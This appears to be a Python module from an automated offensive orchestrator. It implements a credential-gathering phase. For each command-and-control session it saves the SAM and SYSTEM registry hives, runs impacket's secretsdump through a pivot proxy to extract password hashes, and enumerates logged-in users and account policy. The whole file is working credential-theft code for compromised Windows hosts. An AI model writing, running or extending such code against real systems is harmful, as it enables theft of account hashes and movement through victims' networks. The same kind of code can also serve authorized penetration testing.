import time
import logging

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity
from orchestrator.c2.manager import get_c2
from orchestrator.ad.toolkit import get_ad_toolkit
from orchestrator.pivot.manager import get_pivot

logger = logging.getLogger("phase_credential")


async def run_credential(target: str, findings: list[Finding] = None) -> PhaseResult:
    t0 = time.time()
    cred_findings = []
    c2 = get_c2()
    ad = get_ad_toolkit()
    pivot = get_pivot()

    sessions = await c2.refresh_sessions()
    proxy_env = pivot.env_for_target(target)

    for s in sessions:
        for cmd in [
            "reg save HKLM\\SAM /tmp/sam.save",
            "reg save HKLM\\SYSTEM /tmp/system.save",
        ]:
            result = await c2.execute(s.id, cmd)
            if result.output:
                cred_findings.append(Finding(
                    phase="credential", type="registry_saved", target=target,
                    host=s.address, severity=Severity.HIGH,
                    description=f"Saved: {cmd.split()[-1]}",
                    evidence=result.output[:300],
                ))

        if ad.has_impacket:
            dump = ad.secretsdump(s.address, proxy_env=proxy_env)
            if dump.get("hashes_extracted", 0) > 0:
                cred_findings.append(Finding(
                    phase="credential", type="hashdump", target=target,
                    host=s.address, severity=Severity.CRITICAL,
                    description=f"secretsdump: {dump['hashes_extracted']} hashes",
                    evidence="\n".join(dump.get("hashes", [])[:5]),
                    raw=dump,
                ))

    for s in sessions:
        for cmd in [
            'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object Username"',
            "net accounts",
        ]:
            result = await c2.execute(s.id, cmd)
            if result.output and "error" not in result.output.lower():
                cred_findings.append(Finding(
                    phase="credential", type="session_enum", target=target,
                    host=s.address, severity=Severity.INFO,
                    description=f"$ {cmd.split()[-1]}",
                    evidence=result.output[:300],
                ))

    latency = time.time() - t0
    return PhaseResult(
        phase="credential",
        success=len(cred_findings) > 0,
        findings=cred_findings,
        summary=f"Credential gathering: {len(cred_findings)} findings",
        raw_output=f"sessions: {len(sessions)} | impacket: {ad.has_impacket}",
        latency=latency,
    )
